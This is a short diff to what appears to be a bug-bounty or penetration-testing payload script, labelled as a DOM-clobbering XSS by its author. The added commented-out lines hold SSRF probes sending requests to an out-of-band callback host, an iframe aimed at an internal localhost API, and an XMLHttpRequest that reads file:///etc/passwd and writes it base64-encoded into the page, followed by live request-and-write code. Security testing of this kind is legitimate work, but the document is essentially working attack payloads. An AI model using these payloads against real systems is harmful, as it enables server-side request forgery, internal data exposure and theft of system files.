@@ -5,6 +5,26 @@ alert("DOM Clobbering XSS by Hussein on: " + document.domain);
 
 
 
+// <img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>
+// <link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2" >
+// <iframe src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest3"></iframe>
+// <iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>
+
+
+
+// function addNewlines(str) 
+// {var result = '';
+// while (str.length > 0){
+// result += str.substring(0, 100)+ '\n';
+// r = str.substring(100);}
+// return result;}
+// x= new XMLHttpRequest();
+// x.onload = function(){document.write(addNewlines(btoa(this.responseText)))};
+// x.open("GET", "file:///etc/passwd");
+// x.send();
+
+
+
 x= new XMLHttpRequest();
 x.onload = function(){
 document.write(this.responseText)};
